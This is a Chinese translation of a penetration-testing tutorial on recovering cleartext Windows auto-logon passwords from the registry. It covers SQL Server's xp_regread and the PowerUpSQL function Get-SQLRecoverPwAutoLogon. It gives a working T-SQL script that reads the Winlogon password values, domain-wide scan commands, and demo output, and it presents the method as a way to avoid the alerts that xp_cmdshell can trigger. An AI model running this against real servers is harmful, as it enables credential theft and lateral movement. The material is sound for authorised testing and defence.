# 【技术分享】通过SQL Server与PowerUpSQL获取Windows自动登录密码

##### 译文声明
本文为翻译文章，原文来源：netspi.com。译文仅供参考，具体内容及含义请以原文为准。

翻译：[烤土豆](http://bobao.360.cn/member/contribute?uid=20928636)  
预估稿费：100RMB  
投稿方式：发送邮件至 [linwei#360.cn](mailto:linwei#360.cn)，或登录[网页版](http://bobao.360.cn/contribute/index) 在线投稿

## 前言
在本文中，我将演示如何使用PowerUpSQL通过SQL Server转储Windows自动登录密码。此外，还将介绍诸如`xp_regread`等扩展存储过程在渗透测试中的应用方法。

## `xp_regread`的历史简述
自SQL Server 2000以来，`xp_regread`扩展存储过程一直存在。当时，Public角色的成员可以访问SQL Server服务帐户中任何有权限的内容。由于常见的SQL Server运行于LocalSystem账户下，因此该功能的影响非常大。

然而，自SQL Server 2000 SP4发布以来，`xp_regread`的影响已经大大减小，因为增加了一些访问控制，防止低特权用户访问注册表中的敏感位置。现在，无权限用户只能访问与SQL Server相关的注册表路径。以下是一些更有趣的访问路径：
- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server`
- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSSQLServer`
- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Search`
- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SQLServer`
- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows消息子系统`
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Application\SQLServer`
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents`
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SQLServer`
- `HKEY_CURRENT_USER\Software\Microsoft\Mail`
- `HKEY_CURRENT_USER\Control Panel\International`

## 具有Public权限的`xp_regread`的实际用途
尽管对无权限用户的限制较多，`xp_regread`仍然可以在最低权限登录时提供有价值的信息。例如，PowerUpSQL中的`Get-SQLServerInfo`函数可以获取服务器的相关信息：

```powershell
PS C:> Get-SQLServerInfo
ComputerName           : SQLServer1
Instance               : SQLServer1
DomainName             : demo.local
ServiceName            : MSSQLSERVER
ServiceAccount         : NT ServiceMSSQLSERVER
AuthenticationMode     : Windows and SQL Server Authentication
Clustered              : No
SQLServerVersionNumber : 12.0.4213.0
SQLServerMajorVersion  : 2014
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : SP1
OSArchitecture         : X64
OsMachineType          : WinNT
OSVersionName          : Windows 8.1 Pro
OsVersionNumber        : 6.3
Currentlogin           : demouser
IsSysadmin             : Yes
ActiveSessions         : 3
```

需要注意的是，SQL Server SP4中实现的访问控制并不适用于sysadmins。因此，SQL Server服务帐户在注册表中可以访问的任何内容，sysadmin也可以通过`xp_regread`访问。这允许我们从注册表中提取敏感数据，而无需启用`xp_cmdshell`（启用和使用`xp_cmdshell`可能会触发大量警报）。

## 使用`xp_regread`恢复Windows自动登录凭据
可以通过配置使Windows在计算机启动时自动登录。虽然这不是企业环境中的常见配置，但在支持传统POS终端和Kiosk且本地运行SQL Server的环境中较为常见。在这种情况下，未加密的凭据通常存储在以下注册表项中：
- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

利用这些信息，我们可以编写一个基本的T-SQL脚本来提取自动登录凭据，而无需启用`xp_cmdshell`。以下是一个示例脚本，但由于注册表路径不在允许的列表中，必须以sysadmin身份运行：

```sql
-- 获取Windows自动登录凭据
DECLARE @AutoLoginDomain  SYSNAME
EXECUTE master.dbo.xp_regread
    @rootkey = N'HKEY_LOCAL_MACHINE',
    @key = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
    @value_name = N'DefaultDomainName',
    @value = @AutoLoginDomain OUTPUT

DECLARE @AutoLoginUser  SYSNAME
EXECUTE master.dbo.xp_regread
    @rootkey = N'HKEY_LOCAL_MACHINE',
    @key = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
    @value_name = N'DefaultUserName',
    @value = @AutoLoginUser OUTPUT

DECLARE @AutoLoginPassword  SYSNAME
EXECUTE master.dbo.xp_regread
    @rootkey = N'HKEY_LOCAL_MACHINE',
    @key = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
    @value_name = N'DefaultPassword',
    @value = @AutoLoginPassword OUTPUT

-- 显示结果
SELECT @AutoLoginDomain, @AutoLoginUser, @AutoLoginPassword
```

我还创建了一个名为`Get-SQLRecoverPwAutoLogon`的PowerUpSQL函数，可以直接运行它来获取默认和备用的Windows自动登录信息，并返回相关的域名、用户名和密码。以下是命令示例：

```powershell
PS C:> $Accessible = Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose -Threads 15 | Where-Object {$_.Status –eq “Accessible”}
PS C:> $Accessible | Get-SQLRecoverPwAutoLogon -Verbose
VERBOSE: SQLServer1.demo.localInstance1 : Connection Success.
VERBOSE: SQLServer2.demo.localApplication : Connection Success.
VERBOSE: SQLServer2.demo.localApplication : This function requires sysadmin privileges. Done.
VERBOSE: SQLServer3.demo.local2014 : Connection Success.
VERBOSE: SQLServer3.demo.local2014 : This function requires sysadmin privileges. Done.

ComputerName : SQLServer1
Instance     : SQLServer1Instance1
Domain       : demo.local
UserName     : KioskAdmin
Password     : test

ComputerName : SQLServer1
Instance     : SQLServer1Instance1
Domain       : demo.local
UserName     : kioskuser
Password     : KioskUserPassword!
```

## 结尾
即使`xp_regread`扩展存储过程已被部分限制，它在渗透测试期间仍然有许多实用的方法。希望你会对`Get-SQLServerInfo`和`Get-SQLRecoverPwAutoLogon`函数感兴趣并加以利用。

**参考文献**
- [Original Article on netspi.com](https://netspi.com/)